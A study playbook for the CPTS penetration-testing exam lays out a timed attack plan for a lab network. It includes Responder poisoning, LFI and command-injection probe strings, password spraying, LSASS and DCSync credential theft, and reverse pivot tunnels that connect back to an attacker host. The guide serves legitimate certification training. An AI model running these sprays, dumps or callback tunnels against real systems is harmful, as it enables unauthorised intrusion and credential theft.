# Exam Execution Playbook

## How to Use This Document

This is your minute-by-minute, hour-by-hour operational playbook for the CPTS exam. It is NOT a methodology refresher — it is a decision engine for time pressure. Read it before the exam starts. Refer to it whenever you feel lost.

---

## Mindset: The Exam is a Marathon, Not a CTF

```
CPTS Reality:
├── You WILL get stuck multiple times
├── You WILL miss things on first pass
├── You WILL find things you missed by going back
├── The differentiator is NOT skill — it's process discipline
└── The candidates who pass are those who:
    ├── Follow a repeatable process
    ├── Stay organized (notes, creds, screenshots)
    ├── Don't panic when stuck
    └── Know when to pivot
```

---

## Minute 0–30: EXAM START

This window determines whether you coast or fight for the rest of the exam.

### 0:00 – 0:05: Environment Verification

```
[ ] VPN connected? → ping 10.x.x.x (DC or known host)
[ ] DNS resolving? → nslookup <exam-domain>.local
[ ] Attack machine ready? → Check tools are installed
[ ] Internet access? → For hashcat (if using GPU)
[ ] Timer started? → Know your deadline
```

### 0:05 – 0:15: Initial Recon Setup (PARALLELIZE)

Launch these simultaneously — do NOT wait for one to finish:

```
TERMINAL 1: sudo nmap -sn <scope>/24 -oA scans/live-hosts
            (Discover all live hosts)

TERMINAL 2: sudo nmap <scope>/24 -p 80,443,8080,8443 -oA scans/web-hosts
            (Quick web server sweep)

TERMINAL 3: sudo nmap <scope>/24 -p 445,139 -oA scans/smb-hosts
            (Quick SMB sweep — AD indicator)

TERMINAL 4: sudo responder -I tun0 -wrf
            (Start Responder IMMEDIATELY — background)
```

### 0:15 – 0:30: Host Inventory

```
From scan results, build your host inventory:

Host Inventory Table (create in notes immediately):

| IP | Hostname | OS | Open Ports | Web? | SMB? | AD? |
|----|----------|----|------------|------|------|-----|
|    |          |    |            |      |      |     |

Key decisions in first 30 minutes:
├── How many hosts? (5 = hard, 8+ = very hard)
├── Any DCs visible? (Kerberos/LDAP/DNS on 88/389)
├── Any web servers? (Priority 1 targets)
├── Any Linux hosts? (Usually easier initial foothold)
└── Network layout: flat or segmented? (Pivot indicator)
```

---

## Hour 0–1: PHASE 1 — INITIAL FOOTHOLD HUNTING

### Priority Target Selection

```
Attack targets in THIS order:
├── Rank 1: Web applications (80/443/8080/8443)
│   └── Highest probability of initial access
├── Rank 2: SMB null sessions (445)
│   └── Free user enumeration + password spray
├── Rank 3: Responder captures
│   └── Free NetNTLM hashes (running in background)
├── Rank 4: Services with anonymous access (FTP, NFS, LDAP)
│   └── Free information leaks
└── Rank 5: Open services (SSH, RDP, WinRM, MSSQL, MySQL)
    └── Need credentials or exploits
```

### Web Server Deep Dive (If Found)

```
For EACH web server (limit to 20 min per server):

Phase 1 — FAST SCAN (5 min):
├── whatweb <target>
├── curl -s -I <target>
├── ffuf -u <target>/FUZZ -w /common.txt -t 50
├── Check robots.txt, sitemap.xml
└── Check page source for comments/JS

Phase 2 — INJECTION CHECK (10 min):
├── Test ALL parameters for SQLi: ' " ) --
├── Test ALL parameters for LFI: ../../etc/passwd
├── Test ALL parameters for CMDi: ; id | whoami
├── Test ALL file uploads (if present)
└── Test login page for default creds

Phase 3 — BURST SCAN (5 min):
├── ffuf -u <target>/FUZZ -w /directory-list-2.3-medium.txt -t 50
├── ffuf -u <target>/FUZZ -w /web-extensions.txt
├── ffuf for vhosts (if applicable)
└── nmap -sV --script http-* -p 80,443 <target>
```

### SMB Deep Dive (If Found)

```
For EACH SMB host (limit to 10 min per host):

├── smbclient -N -L //target
├── rpcclient -U "" -N target enumdomusers
├── netexec smb target -u '' -p '' --shares
├── nmap --script smb2-security-mode -p 445 target
├── nmap --script smb-vuln-* -p 445 target
└── enum4linux -a target > enum4linux-output.txt
```

### Key Decision at Minute 60

```
HAVE INITIAL FOOTHOLD? (shell, creds, or web access)
├── YES → Proceed to Hour 1–2 Strategy
└── NO → DO NOT PANIC
    ├── Full TCP scan on ALL hosts (-p- on most likely host)
    ├── Try AS-REP roasting (Kerberos user enum)
    ├── Continue password spray with common passwords
    ├── Run ffuf with larger wordlists
    ├── Check non-standard ports
    └── Re-read scope: did you miss an attack surface?
```

---

## Hour 1–3: PHASE 2 — FIRST FOOTHOLD

### First Foothold Strategy

```
Target: ANY access — shell, password, or service access

BEST BET for first foothold (by probability):

1. Web vulnerability (SQLi, LFI, File Upload, CMDi)
   ├── Get either: file read, SQL data, or code execution
   └── From file read: look for passwords, SSH keys, DB creds

2. Password spray / Cracking
   ├── Users from: SMB null session, Kerbrute, LDAP anonymous
   ├── Passwords: CompanyName1!, Spring2024!, Welcome1
   └── Hashes from: Responder, AS-REP roast

3. Service exploitation
   ├── MSSQL: sa:sa, xp_cmdshell
   ├── SMB: EternalBlue (rare but check)
   ├── WinRM: admin:admin, common creds
   └── NFS: mounted home dirs → SSH keys

4. Hash capture via Responder
   ├── Running from minute 0
   └── Check /usr/share/responder/logs/ periodically
```

### After Every Successful Access — IMMEDIATE LOOP

```
FOOTHOLD OBTAINED — RUN THIS EVERY TIME:

[ ] whoami / id → Current user context
[ ] ip addr / ifconfig / ipconfig → Network position
[ ] hostname → System identity
[ ] Check for domain join → CRITICAL flag
[ ] Start cred harvest in parallel:
    ├── Config files, .env, web.config, xml
    ├── SSH keys, bash history
    ├── SAM/LSASS (if admin)
    └── Browser creds, saved passwords
[ ] Test ALL found creds against ALL hosts
[ ] Check pivoting (multi-homed, routes)
[ ] Screenshot everything
```

---

## Hour 3–6: PHASE 3 — CREDENTIAL EXPANSION + PRIVESC

### First Credential Strategy

```
FOUND A PASSWORD — IMMEDIATE ACTIONS:

├── STEP 1: Classify
│   ├── Is it a domain credential? → AD attack chain
│   ├── Is it a local credential? → Test on its host
│   └── Is it a service account? → Check SPN, Kerberoast
│
├── STEP 2: Test EVERYWHERE (netexec sweep)
│   ├── netexec smb <subnet>/24 -u user -p pass
│   ├── netexec winrm <subnet>/24 -u user -p pass
│   ├── netexec ssh <subnet>/24 -u user -p pass
│   ├── netexec mssql <subnet>/24 -u user -p pass
│   └── hydra -l user -p pass rdp://target
│
├── STEP 3: If domain credential
│   ├── bloodhound-python -u user -p pass -d domain -ns DC
│   ├── GetUserSPNs -request
│   └── ldapdomaindump
│
└── STEP 4: If hash found
    ├── Background: hashcat -m 1000/5600 hash.txt rockyou.txt
    ├── Foreground: Immediately Pass-the-Hash
    └── psexec.py / wmiexec.py / evil-winrm -H
```

### Privilege Escalation Strategy

```
Linux — Run in parallel:
├── linpeas.sh | tee linpeas.txt
├── sudo -l (always check first — most common oversight)
├── find / -perm -4000 -type f (SUID)
├── getcap -r / 2>/dev/null (capabilities)
├── pspy64 (run for 5 min in background)
└── cat /etc/crontab, /etc/cron.d/*

Windows — Run in parallel:
├── winPEASany.exe | tee winpeas.txt
├── whoami /priv (check SeImpersonate)
├── whoami /groups (check interesting AD groups)
├── cmdkey /list
├── systeminfo (OS version for exploits)
└── Get-Service (check for unquoted paths)
```

---

## Hour 6–12: PHASE 4 — AD ENGAGEMENT + PIVOTING

### First AD Host Strategy

```
DOMAIN-JOINED HOST COMPROMISED:

├── STEP 1: Determine access level
│   ├── Admin on host? → LSASS dump (mimikatz/secretsdump)
│   └── Non-admin? → Cred hunt + immediate privesc
│
├── STEP 2: BloodHound — RUN IMMEDIATELY
│   ├── From Windows: SharpHound.exe
│   ├── From Linux: bloodhound-python
│   └── Look for: shortest path to DA
│
├── STEP 3: Kerberos attacks
│   ├── Kerberoast (TGS → crack → service account)
│   ├── AS-REP roast (users without pre-auth)
│   └── Check delegation (unconstrained/constrained/RBCD)
│
├── STEP 4: ADCS check
│   ├── certipy find -u user@domain -p pass -dc-ip DC
│   ├── Check ESC1-ESC10
│   └── ESC8 = relay to ADCS if signing disabled
│
└── STEP 5: Lateral movement
    ├── Test creds against ALL domain hosts
    ├── Cracking running in background
    └── New host = restart this loop
```

### Pivot Strategy

```
MULTI-HOMED HOST FOUND:

├── STEP 1: Map the new subnet
│   ├── ip route / route print
│   ├── arp -a
│   └── Identify new subnet(s)
│
├── STEP 2: Deploy pivot tool
│   ├── Root on pivot? → LIGOLO-NG (best option)
│   │   └── ./ligolo-agent -connect <attacker>:11601 -ignore-cert
│   ├── No root? → CHISEL (SOCKS, no root)
│   │   └── ./chisel client <attacker>:8000 R:1080:socks
│   └── SSH access? → SSHHUTTLE (Linux only)
│       └── sshuttle -r user@pivot <new_subnet>/24
│
├── STEP 3: Scan new subnet
│   ├── nmap -sn <new_subnet>/24 (through pivot)
│   ├── nmap -sV <new_hosts> (service scan)
│   └── Spray known creds against new hosts
│
└── STEP 4: Restart methodology on new hosts
    ├── Web? → Module 04
    ├── Services? → Module 07
    └── Domain? → Module 11
```

---

## Hour 12–24: PHASE 5 — DOMAIN ESCALATION

### Domain Escalation Strategy

```
GOAL: Domain Admin or Equivalent

Attack paths ranked by probability:

1. ACL Abuse (BloodHound path)
   ├── GenericAll, WriteOwner, WriteDACL, ForceChangePassword
   ├── Most common DA path in CPTS exam
   └── Execute directly from identified nodes

2. ADCS (Certificate Services)
   ├── ESC1: Low-priv user can enroll + SAN
   ├── ESC8: NTLM relay to ADCS
   └── Get cert → auth as DA

3. Delegation Abuse
   ├── Unconstrained: Compromise delegation host
   ├── Constrained: getST → Impersonate DA
   └── RBCD: Set AllowedToActOnBehalfOf

4. DCSync
   ├── Need: Replication rights (ReplicateDirectoryChanges)
   ├── Check: Does any account have DCSync?
   └── If yes: secretsdump.py → ALL hashes

5. Kerberoast + Crack
   ├── If service account is DA → Immediate DA
   └── If not → Service account lateral to DA

6. Trust Abuse
   ├── Child → Parent (SID filtering, extrace)
   └── Cross-forest (trust enumeration)
```

---

## Hour 24+: PHASE 6 — ENDGAME

### Endgame Strategy

```
ALL HOSTS COMPROMISED? DA ACHIEVED?

├── YES → Data collection phase
│   ├── Collect all flags systematically
│   ├── Reconstruct full attack chain
│   ├── Compile screenshot evidence
│   ├── Document all credentials found
│   └── Start report writing
│
├── PARTIAL → Don't stop at DA
│   ├── Subdomains still unpenetrated?
│   ├── Linux hosts not yet root?
│   ├── Flags hidden everywhere — check all hosts
│   └── Check for forest trusts (parent domain?)
│
└── NO, MISSING SOMETHING
    ├── Re-read scope: are there flags you haven't found?
    ├── Re-check methodology: did you miss enumeration?
    ├── Check hosts you didn't fully explore
    └── Sometimes the last flag is in an obvious place you overlooked
```

### Evidence Collection — DO THIS CONTINUOUSLY

```
Screenshot template for EVERY finding:

"Screenshot the command AND output in one frame"

Required screenshots:
├── Initial scan results (nmap output)
├── Initial access (command + proof of shell)
├── Privilege escalation (before/after)
├── Credential discovery (where it was found)
├── Lateral movement (source → target)
├── Domain compromise (proof of DA)
├── Flags (with context: whoami, hostname, ip addr)
└── Full attack chain summary
```

---

## Prioritization Framework

```
DECISION MATRIX — What should you work on RIGHT NOW?

┌─────────────────────────────┬──────────┬──────────┐
│ IF YOU HAVE                 │ PRIORITY │ TIMEBOX  │
├─────────────────────────────┼──────────┼──────────┤
│ No foothold at all          │ CRITICAL │ 2 hours  │
│ Web server unexplored       │ CRITICAL │ 20 min   │
│ SMB null session possible   │ CRITICAL │ 15 min   │
│ Responder captured hash     │ HIGH     │ 30 min   │
│ Shell on new host           │ HIGH     │ 30 min   │
│ Domain credential found     │ HIGH     │ 45 min   │
│ BloodHound DA path          │ CRITICAL │ 1 hour   │
│ Multi-homed host            │ HIGH     │ 30 min   │
│ Hash not cracking           │ LOW      │ 5 min    │
│ Report writing              │ LOW      │ deferred │
└─────────────────────────────┴──────────┴──────────┘
```

---

## Time Allocation Guidance

```
┌─────────────────────────────────┬──────────┬───────────────┐
│ ACTIVITY                        │ MAX TIME │ WHEN TO STOP  │
├─────────────────────────────────┼──────────┼───────────────┤
│ Full nmap scan (-p-)           │ 30 min   │ All ports done│
│ Web app enumeration per host   │ 40 min   │ No findings   │
│ Password cracking (hashcat)     │ Setup: 5 min, run: background │
│ Privilege escalation per host  │ 45 min   │ All vectors tried │
│ BloodHound analysis            │ 30 min   │ DA path found or not │
│ ADCS enumeration               │ 20 min   │ ESC found or not │
│ Pivot deployment               │ 15 min   │ Subnet reachable │
│ Stuck (no progress)            │ 15 min   │ Take break, switch host │
├─────────────────────────────────┴──────────┴───────────────┤
│ TOTAL TIME BEFORE SHOULD HAVE DA: ~6-8 hours            │
│ If no DA by hour 12: you missed something                │
└───────────────────────────────────────────────────────────┘
```

---

## When to Stop Enumerating

```
STOP ENUMERATING WHEN:
├── You have a clear attack path to execute
├── You found a credential that needs testing
├── You have a shell — exploit the shell, don't scan more
├── BloodHound identified a DA path
└── You found a service vulnerability — exploit it

CONTINUE ENUMERATING WHEN:
├── No clear path exists
├── Current attack path failed
├── Stuck on privilege escalation
├── Need more users for password spray
└── You just entered a new subnet (via pivot)
```

---

## When to Pivot

```
PIVOT WHEN:
├── Host has 2+ NICs with different subnets
├── Current subnet exhausted (all hosts enumerated)
├── Need to reach DC in another subnet
├── Found credentials but target not accessible from attacker
└── Need to run tools from behind firewall

DO NOT PIVOT WHEN:
├── Current subnet still has unexplored hosts
├── Current host still has privesc paths to try
├── You don't know WHERE you're pivoting to
└── Responder is still running (it works on local subnet only)
```

---

## When to Switch Attack Paths

```
SWITCH ATTACK PATH WHEN:
├── Current path failed for 30+ minutes
├── You tried all known techniques for this vector
├── New information suggests a different path
├── You found a credential (always test it before continuing)
└── BloodHound shows a different, faster DA path

STICK WITH CURRENT PATH WHEN:
├── Making progress (shell, creds, access)
├── Close to key objective (admin, DA)
├── New technique to try on same vector
└── Only one viable path exists
```

---

## Common CPTS Failure Modes

```
F1: TOO MUCH ENUMERATION, NOT ENOUGH EXPLOITATION
├── "I know everything about the network but haven't exploited anything"
├── FIX: Stop scanning. Start attacking. One shell > 10,000 nmap results.
└── Set a timer: 20 min enum → 20 min exploitation → repeat

F2: CREDENTIAL HOARDING WITHOUT TESTING
├── "I have 50 passwords but haven't tested any of them"
├── FIX: Every found credential gets tested immediately. netexec sweep.
└── Rule: Found a cred? Stop everything. Test it everywhere. Right now.

F3: LOSING THE ATTACK CHAIN
├── "I had a shell somewhere but I don't remember what I did"
├── FIX: Keep a running log. Copy-paste every command with output.
└── Tools: Keep a notes file open — timestamp every action.

F4: SUNK COST ON A HOST
├── "I've been on this Linux box for 3 hours and can't get root"
├── FIX: Not every host escalates. Harvest creds and move.
└── Rule: 45 min max per host for privesc. After that, move on.

F5: MISSING THE OBVIOUS
├── "I did everything but the exam was easy"
├── FIX: You missed sudo -l, misconfigured winrm, or null session.
└── Always start with the simplest check. Most CPTS exams have at least one easy win.

F6: POOR TIME MANAGEMENT
├── "I spent 2 days on Phase A and now I only have 1 day for everything else"
├── FIX: Follow the time allocation table above. Be ruthless.
└── Rule: If you haven't found first foothold in 3 hours, you need a new approach.

F7: NOT USING RESPONDER
├── "I never ran Responder"
├── FIX: Run Responder from minute 0 until you're done with AD.
└── Rule: Responder runs in background. Always. No exceptions.

F8: NOT TAKING SCREENSHOTS
├── "I compromised everything but have no evidence"
├── FIX: Screenshot every command with its output. You need it for the report.
└── Rule: If you're proud of it, screenshot it. If you're not proud, screenshot it anyway.
```

---

## Quick Reference: The Iterative Loop

```
FOOTHOLD → 
  ├── Who/where am I?
  ├── What creds can I get?
  ├── Can I escalate?
  ├── Can I pivot?
  ├── Can I AD attack?
  └── LOOP back
```

---

## Cross-References

- Loot value assessment → [loot-priority-framework.md](./loot-priority-framework.md)
- Credential handling → [credential-reuse-matrix.md](./credential-reuse-matrix.md)
- Attack path selection → [high-probability-paths.md](./high-probability-paths.md)
- Quick decision lookup → [exam-dashboard.md](./exam-dashboard.md)
- Service enumeration depth → [enumeration-completeness.md](./enumeration-completeness.md)
- Full methodology → [Module 15: Exam Strategy](../modules/15-exam-strategy.md)
- Attack graph navigation → [Module 99: Attack Graph](../modules/99-attack-graph.md)
